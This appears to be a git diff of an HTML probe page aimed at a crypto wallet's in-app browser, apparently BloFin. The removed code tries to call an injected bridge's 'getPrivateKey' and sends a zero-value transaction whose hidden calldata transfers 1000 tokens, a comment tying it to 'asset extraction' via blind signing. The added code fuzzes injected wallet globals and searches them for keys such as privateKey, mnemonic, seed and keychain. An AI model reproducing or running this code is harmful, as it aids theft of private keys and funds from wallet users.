@@ -1,36 +1,61 @@
 <html>
-<body style="background:#000;color:#0f0;padding:20px">
-<button onclick="connect()" style="padding:20px">1. CONNECT WALLET</button>
-<button onclick="testCritical()" style="padding:20px">2. TEST KRITIS</button>
-<pre id="log"></pre>
+<body style="background:#000;color:#0f0;font-family:monospace;padding:15px">
+<button onclick="fuzz()" style="padding:20px;width:100%">FUZZ WALLET_BRIDGE_IN</button>
+<pre id="log" style="white-space:pre-wrap;word-break:break-all"></pre>
 <script>
-let acc = null;
-async function connect(){
-  let r = await window.ethereum.request({method:'eth_requestAccounts'});
-  acc = r[0];
-  document.getElementById('log').innerText = "Connected: " + acc;
-}
-async function testCritical(){
-  let log = (m)=> document.getElementById('log').innerText += "\n" + m;
+function log(m){ document.getElementById('log').innerText += m+"\n"; }
 
-  // TEST 1: Coba akses bridge internal
-  try{
-    let res = window.__WALLET_BRIDGE_IN__.call("getPrivateKey", {});
-    log("CRITICAL FOUND: __WALLET_BRIDGE_IN__ bisa dipanggil! " + res);
-  }catch(e){ log("Bridge getPrivateKey blocked: "+e.message); }
+function fuzz(){
+  document.getElementById('log').innerText = "";
+  let targets = ["__WALLET_BRIDGE_IN__", "__WALLET_EMIT__", "__WALLET_ERROR_COUNT__", "__WALLET_BRIDGE__", "WALLET_BRIDGE_IN"];
 
-  // TEST 2: Transaction Spoof - ini yang kamu cari untuk "ekstraksi aset"
-  // Kita kirim value 0 tapi data nya transfer all
-  let tx = {
-    from: acc,
-    to: acc, // kirim ke diri sendiri dulu untuk test
-    value: "0x0",
-    data: "0xa9059cbb0000000000000000000000006a4c4c7e2f2a8b8c8d8e8f8a8b8c8d8e8f8a8b8000000000000000000000000000000000000000000000000000000000000003e8"
-  };
-  try{
-    await window.ethereum.request({method:'eth_sendTransaction', params:[tx]});
-    log("Cek UI BloFin: apakah menampilkan 'Transfer 1000 token ke attacker'? Kalau tidak = Kritis Blind Signing");
-  }catch(e){ log("Tx blocked: "+e.message); }
+  targets.forEach(name=>{
+    let obj = window[name];
+    if(!obj){ log(`[NOT FOUND] window.${name}`); return; }
+
+    log(`\n========== [FOUND] window.${name} ==========`);
+    log(`typeof: ${typeof obj}`);
+    log(`String: ${String(obj).substring(0,200)}`);
+
+    try{
+      let own = Object.getOwnPropertyNames(obj);
+      log(`getOwnPropertyNames: [${own.join(", ")}]`);
+    }catch(e){ log(`getOwnPropertyNames error: ${e}`); }
+
+    try{
+      let proto = Object.getOwnPropertyNames(Object.getPrototypeOf(obj));
+      log(`getPrototypeOf: [${proto.join(", ")}]`);
+    }catch(e){ log(`getPrototypeOf error: ${e}`); }
+
+    try{
+      let keys = [];
+      for(let k in obj) keys.push(k);
+      log(`for...in: [${keys.join(", ")}]`);
+    }catch(e){ log(`for...in error: ${e}`); }
+
+    // Cek apakah callable
+    if(typeof obj === 'function'){
+      log(`-> Ini FUNCTION, bisa dipanggil!`);
+      try{
+        // jangan panggil dengan data sensitif, cuma test kosong
+        let r = obj.toString().substring(0,500);
+        log(`func toString: ${r}`);
+      }catch(e){}
+    }
+
+    // Cek property yang bahaya
+    let dangerous = ["clipboard","keychain","privateKey","mnemonic","seed","keystore","file","open","export","secret","password","biometric"];
+    dangerous.forEach(d=>{
+      if(JSON.stringify(Object.getOwnPropertyNames(obj)).toLowerCase().includes(d)){
+        log(`!!! POTENTIAL CRITICAL KEYWORD: ${d}!!!`);
+      }
+    });
+  });
+
+  // Cek global juga
+  log("\n========== GLOBAL SCAN ==========");
+  let all = Object.keys(window).filter(k=>k.includes("WALLET")||k.includes("BRIDGE")||k.includes("BLOFIN")||k.includes("CLIP"));
+  log(`window keys containing WALLET/BRIDGE/BLOFIN/CLIP: [${all.join(", ")}]`);
 }
 </script>
 </body>
